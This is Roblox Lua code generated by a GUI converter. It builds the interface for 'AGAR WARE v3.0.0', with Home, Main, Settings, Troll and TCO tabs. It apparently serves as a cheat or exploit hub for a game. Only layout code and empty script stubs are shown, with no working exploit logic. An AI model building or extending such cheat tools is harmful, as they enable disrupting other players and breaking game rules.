--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 816 | Scripts: 34 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.T5784YHRGE89ES98T
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["DisplayOrder"] = 1999999999;
G2L["1"]["Name"] = [[T5784YHRGE89ES98T]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.T5784YHRGE89ES98T.mainScript
G2L["2"] = Instance.new("LocalScript", G2L["1"]);
G2L["2"]["Name"] = [[mainScript]];


-- StarterGui.T5784YHRGE89ES98T.guicolor
G2L["3"] = Instance.new("LocalScript", G2L["1"]);
G2L["3"]["Name"] = [[guicolor]];


-- StarterGui.T5784YHRGE89ES98T.startupScript
G2L["4"] = Instance.new("LocalScript", G2L["1"]);
G2L["4"]["Name"] = [[startupScript]];


-- StarterGui.T5784YHRGE89ES98T..
G2L["5"] = Instance.new("LocalScript", G2L["1"]);
G2L["5"]["Name"] = [[.]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame
G2L["6"] = Instance.new("Frame", G2L["1"]);
G2L["6"]["ZIndex"] = 1000000000;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["6"]["Size"] = UDim2.new(0, 450, 0, 300);
G2L["6"]["Position"] = UDim2.new(0.25851, 0, 0.16374, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[MainFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.itsthisone
G2L["7"] = Instance.new("TextLabel", G2L["6"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextTransparency"] = 1;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["7"]["Visible"] = false;
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Name"] = [[itsthisone]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar
G2L["8"] = Instance.new("Frame", G2L["6"]);
G2L["8"]["ZIndex"] = 99;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["Size"] = UDim2.new(0, 450, 0, 20);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Name"] = [[topbar]];
G2L["8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.topbarScript
G2L["9"] = Instance.new("LocalScript", G2L["8"]);
G2L["9"]["Name"] = [[topbarScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.text
G2L["a"] = Instance.new("TextLabel", G2L["8"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 11;
G2L["a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["RichText"] = true;
G2L["a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[AGAR WARE | v3.0.0 | fps X.X | Xms | server: X/X]];
G2L["a"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.text.text
G2L["b"] = Instance.new("UIStroke", G2L["a"]);
G2L["b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.minimise
G2L["c"] = Instance.new("TextButton", G2L["8"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["ZIndex"] = 9999;
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["Size"] = UDim2.new(0, 60, 0, 20);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[-]];
G2L["c"]["Name"] = [[minimise]];
G2L["c"]["Position"] = UDim2.new(0.86451, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.minimise.text
G2L["d"] = Instance.new("UIStroke", G2L["c"]);
G2L["d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.UIPadding
G2L["e"] = Instance.new("UIPadding", G2L["8"]);
G2L["e"]["PaddingLeft"] = UDim.new(0, 7);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe
G2L["f"] = Instance.new("Frame", G2L["6"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["f"]["Size"] = UDim2.new(0, 440, 0, 275);
G2L["f"]["Position"] = UDim2.new(0, 5, 0, 20);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Name"] = [[innerframe]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar
G2L["10"] = Instance.new("Frame", G2L["f"]);
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["10"]["Size"] = UDim2.new(0, 60, 0, 265);
G2L["10"]["Position"] = UDim2.new(0, 5, 0, 5);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[sidebar]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling
G2L["11"] = Instance.new("ScrollingFrame", G2L["10"]);
G2L["11"]["Active"] = true;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["ScrollingEnabled"] = false;
G2L["11"]["Name"] = [[sidebarScrolling]];
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["Size"] = UDim2.new(0, 60, 0, 265);
G2L["11"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["ScrollBarThickness"] = 0;
G2L["11"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home
G2L["12"] = Instance.new("TextButton", G2L["11"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextTransparency"] = 1;
G2L["12"]["TextSize"] = 14;
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[]];
G2L["12"]["Name"] = [[Home]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.text
G2L["13"] = Instance.new("TextLabel", G2L["12"]);
G2L["13"]["ZIndex"] = 2;
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["TextSize"] = 12;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["BackgroundTransparency"] = 1;
G2L["13"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Text"] = [[Home]];
G2L["13"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.text.text
G2L["14"] = Instance.new("UIStroke", G2L["13"]);
G2L["14"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.buttonFade
G2L["15"] = Instance.new("CanvasGroup", G2L["12"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.buttonFade.UIGradient
G2L["16"] = Instance.new("UIGradient", G2L["15"]);
G2L["16"]["Rotation"] = 90;
G2L["16"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Home.greystroke
G2L["17"] = Instance.new("UIStroke", G2L["12"]);
G2L["17"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["17"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main
G2L["18"] = Instance.new("TextButton", G2L["11"]);
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextTransparency"] = 1;
G2L["18"]["TextSize"] = 14;
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["18"]["LayoutOrder"] = 2;
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[]];
G2L["18"]["Name"] = [[Main]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.text
G2L["19"] = Instance.new("TextLabel", G2L["18"]);
G2L["19"]["ZIndex"] = 2;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 12;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[Main]];
G2L["19"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.text.text
G2L["1a"] = Instance.new("UIStroke", G2L["19"]);
G2L["1a"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.buttonFade
G2L["1b"] = Instance.new("CanvasGroup", G2L["18"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.buttonFade.UIGradient
G2L["1c"] = Instance.new("UIGradient", G2L["1b"]);
G2L["1c"]["Rotation"] = 90;
G2L["1c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Main.greystroke
G2L["1d"] = Instance.new("UIStroke", G2L["18"]);
G2L["1d"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1d"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings
G2L["1e"] = Instance.new("TextButton", G2L["11"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextTransparency"] = 1;
G2L["1e"]["TextSize"] = 14;
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["1e"]["LayoutOrder"] = 1;
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[]];
G2L["1e"]["Name"] = [[Settings]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.text
G2L["1f"] = Instance.new("TextLabel", G2L["1e"]);
G2L["1f"]["ZIndex"] = 2;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextSize"] = 12;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[Settings]];
G2L["1f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.text.text
G2L["20"] = Instance.new("UIStroke", G2L["1f"]);
G2L["20"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.buttonFade
G2L["21"] = Instance.new("CanvasGroup", G2L["1e"]);
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.buttonFade.UIGradient
G2L["22"] = Instance.new("UIGradient", G2L["21"]);
G2L["22"]["Rotation"] = 90;
G2L["22"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Settings.greystroke
G2L["23"] = Instance.new("UIStroke", G2L["1e"]);
G2L["23"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["23"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll
G2L["24"] = Instance.new("TextButton", G2L["11"]);
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["TextTransparency"] = 1;
G2L["24"]["TextSize"] = 14;
G2L["24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["24"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["24"]["LayoutOrder"] = 3;
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Text"] = [[]];
G2L["24"]["Name"] = [[Troll]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.text
G2L["25"] = Instance.new("TextLabel", G2L["24"]);
G2L["25"]["ZIndex"] = 2;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextSize"] = 12;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Troll]];
G2L["25"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.text.text
G2L["26"] = Instance.new("UIStroke", G2L["25"]);
G2L["26"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.buttonFade
G2L["27"] = Instance.new("CanvasGroup", G2L["24"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.buttonFade.UIGradient
G2L["28"] = Instance.new("UIGradient", G2L["27"]);
G2L["28"]["Rotation"] = 90;
G2L["28"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.Troll.greystroke
G2L["29"] = Instance.new("UIStroke", G2L["24"]);
G2L["29"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["29"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["29"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.pagehandler
G2L["2a"] = Instance.new("LocalScript", G2L["11"]);
G2L["2a"]["Name"] = [[pagehandler]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain
G2L["2b"] = Instance.new("TextButton", G2L["11"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextTransparency"] = 1;
G2L["2b"]["TextSize"] = 14;
G2L["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["Size"] = UDim2.new(0, 60, 0, 22);
G2L["2b"]["LayoutOrder"] = 100;
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[]];
G2L["2b"]["Name"] = [[TCOMain]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.text
G2L["2c"] = Instance.new("TextLabel", G2L["2b"]);
G2L["2c"]["ZIndex"] = 2;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextSize"] = 12;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundTransparency"] = 1;
G2L["2c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[Main]];
G2L["2c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.text.text
G2L["2d"] = Instance.new("UIStroke", G2L["2c"]);
G2L["2d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.buttonFade
G2L["2e"] = Instance.new("CanvasGroup", G2L["2b"]);
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.buttonFade.UIGradient
G2L["2f"] = Instance.new("UIGradient", G2L["2e"]);
G2L["2f"]["Rotation"] = 90;
G2L["2f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.TCOMain.greystroke
G2L["30"] = Instance.new("UIStroke", G2L["2b"]);
G2L["30"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["30"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["30"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---
G2L["31"] = Instance.new("Frame", G2L["11"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["31"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Name"] = [[---DIVIDER---]];
G2L["31"]["LayoutOrder"] = 98;
G2L["31"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.dividerFrame
G2L["32"] = Instance.new("Frame", G2L["31"]);
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["32"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["32"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["32"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["32"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.dividerFrame.outlineStroke
G2L["33"] = Instance.new("UIStroke", G2L["32"]);
G2L["33"]["Thickness"] = 2;
G2L["33"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.dividerFrame.buttonFade
G2L["34"] = Instance.new("CanvasGroup", G2L["32"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["35"] = Instance.new("UIGradient", G2L["34"]);
G2L["35"]["Rotation"] = 90;
G2L["35"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.dividerFrame.UIStroke
G2L["36"] = Instance.new("UIStroke", G2L["32"]);
G2L["36"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["36"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.dividerFrame.UICorner
G2L["37"] = Instance.new("UICorner", G2L["32"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.UIPadding
G2L["38"] = Instance.new("UIPadding", G2L["31"]);
G2L["38"]["PaddingTop"] = UDim.new(0, 6);
G2L["38"]["PaddingRight"] = UDim.new(0, 3);
G2L["38"]["PaddingLeft"] = UDim.new(0, 3);
G2L["38"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.text
G2L["39"] = Instance.new("TextLabel", G2L["31"]);
G2L["39"]["ZIndex"] = 10;
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["TextSize"] = 11;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["BackgroundTransparency"] = 1;
G2L["39"]["Size"] = UDim2.new(0, 25, 1, 0);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[TCO]];
G2L["39"]["Name"] = [[text]];
G2L["39"]["Position"] = UDim2.new(0, 15, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.text.UIPadding
G2L["3a"] = Instance.new("UIPadding", G2L["39"]);
G2L["3a"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.---DIVIDER---.text.text
G2L["3b"] = Instance.new("UIStroke", G2L["39"]);
G2L["3b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.UIListLayout
G2L["3c"] = Instance.new("UIListLayout", G2L["11"]);
G2L["3c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.greystroke
G2L["3d"] = Instance.new("UIStroke", G2L["10"]);
G2L["3d"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["3d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3d"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea
G2L["3e"] = Instance.new("Frame", G2L["f"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(19, 19, 19);
G2L["3e"]["Size"] = UDim2.new(0, 370, 0, 265);
G2L["3e"]["Position"] = UDim2.new(0, 65, 0, 5);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Name"] = [[contentarea]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home
G2L["3f"] = Instance.new("ScrollingFrame", G2L["3e"]);
G2L["3f"]["Visible"] = false;
G2L["3f"]["Active"] = true;
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["3f"]["Name"] = [[Home]];
